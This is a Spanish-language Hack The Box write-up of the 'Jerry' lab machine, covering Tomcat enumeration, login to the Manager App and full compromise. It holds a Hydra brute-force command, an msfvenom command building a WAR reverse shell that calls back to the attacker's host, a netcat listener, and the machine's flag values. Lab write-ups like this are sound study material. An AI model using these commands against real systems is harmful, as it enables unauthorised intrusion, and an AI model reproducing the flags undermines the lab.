---
tags:
  - env/windows
  - estado/completo
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/144
dificultad: Muy fácil
ip: 10.10.10.95
os: Windows
linked:
  - "[[Information Leakage]]"
  - "[[Abusing Tomcat]]"
  - "[[msfvenom]]"
---
# HackTheBox - Jerry

## Reconocimiento

### Escaneo con Nmap

Para comenzar mi evaluación, realicé un escaneo de puertos exhaustivo sobre la dirección IP del objetivo, `10.129.136.9`. Mi metodología consiste en dos fases: primero, un escaneo rápido para identificar todos los puertos TCP abiertos y, segundo, un escaneo más detallado sobre esos puertos descubiertos para enumerar servicios y versiones.
```Bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG 00_Reconnaissance/allports
nmap -sCV -p22,80 $(cat ip) -oN 00_Reconnaissance/sCV
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-14 14:46 BST
Nmap scan report for 10.129.136.9
Host is up (0.047s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.27 seconds
```

El único puerto abierto era el **8080**, que alojaba un servicio **Apache Tomcat 7.0.88**. Esto inmediatamente se convirtió en mi principal vector de ataque.


---

## Análisis de vulnerabilidades

### Enumeración del Servicio Web Apache Tomcat

Al acceder con mi navegador a `http://10.129.136.9:8080`, me encontré con la página de bienvenida por defecto de Tomcat. Explorando las opciones disponibles, localicé el enlace a la interfaz de **"Manager App"**. Al intentar acceder, se me presentó un formulario de autenticación HTTP.

Durante la enumeración del sitio, encontré las credenciales de acceso expuestas. Con la combinación de usuario y contraseña en mi poder, mi siguiente paso fue autenticarme.

> [!note] Alternativa: Fuerza Bruta con Hydra
> 
> Si no hubiera encontrado las credenciales directamente, mi siguiente paso habría sido realizar un ataque de fuerza bruta con una herramienta como Hydra, utilizando un diccionario común de credenciales para Tomcat. El comando habría sido similar a este:
> 
> hydra -L users.txt -P passwords.txt 10.129.136.9 http-get /manager/html


---

## Explotación de vulnerabilidades

### Acceso al Panel de Administración con Burp Suite

Al intentar iniciar sesión por primera vez con una credencial incorrecta, el navegador almacenó en caché esa autenticación fallida. Para asegurar un inicio de sesión limpio con las credenciales correctas que encontré, utilicé **Burp Suite** para interceptar la solicitud. Esto me permitió eliminar cualquier cabecera de autenticación previa y enviar únicamente la correcta, codificada en Base64, asegurando el acceso al panel de administración.

### Generación y Despliegue del Payload WAR

Con acceso al "Manager App", el objetivo era ejecutar código. La forma más directa de hacerlo es subiendo un archivo WAR malicioso que contenga una reverse shell.

Para generar el payload, utilicé **msfvenom**:
```Bash
msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.17 LPORT=443 -f war -o reverse.war
```

Este comando creó un archivo `reverse.war` diseñado para establecer una conexión inversa a mi máquina (`10.10.14.17`) por el puerto `443`.

Simultáneamente, puse un listener en mi máquina para recibir la conexión entrante usando `netcat`:
```Bash
nc -lvnp 443
```

Una vez con el listener activo y el payload generado, accedí a la sección "WAR file to deploy" en el panel de administración de Tomcat, seleccioné mi archivo `reverse.war` y lo desplegué.

Inmediatamente, la aplicación se ejecutó en el servidor y mi listener `netcat` recibió la conexión, otorgándome una shell interactiva en el sistema víctima.


---

## Escalada de privilegios

Una vez obtuve una shell inversa en mi listener, mi primer instinto fue verificar mi nivel de privilegios actual con el comando `whoami`.
```
C:\apache-tomcat-7.0.88>whoami
nt authority\system
```

> [!danger] Privilegios Excesivos de Servicio
> 
> Ejecutar servicios de red, especialmente servidores web como Tomcat, con privilegios de NT AUTHORITY\SYSTEM es una práctica de seguridad extremadamente pobre. Cualquier vulnerabilidad en la aplicación web, como en este caso el acceso al panel de administración, se traduce directamente en una compromisión total e instantánea del sistema operativo, eliminando la necesidad de realizar pasos adicionales de escalada de privilegios.

La shell ya operaba con los máximos privilegios posibles en un sistema Windows. No fue necesaria ninguna técnica de escalada adicional. Desde allí, tuve acceso irrestricto al sistema de archivos y pude leer ambas flags directamente desde el escritorio del Administrador.

```
C:\apache-tomcat-7.0.88>type C:\Users\Administrator\Desktop\flags\"2 for the price of 1.txt"
```


---

## Bandera(s)

> [!flag] `flag{user}`
> 7004dbcef0f854e0fb401875f26ebd00
^bandera-user

> [!flag] `flag{root}`
> 04a8b36e1545a455393d067e772fe90e
^bandera-root
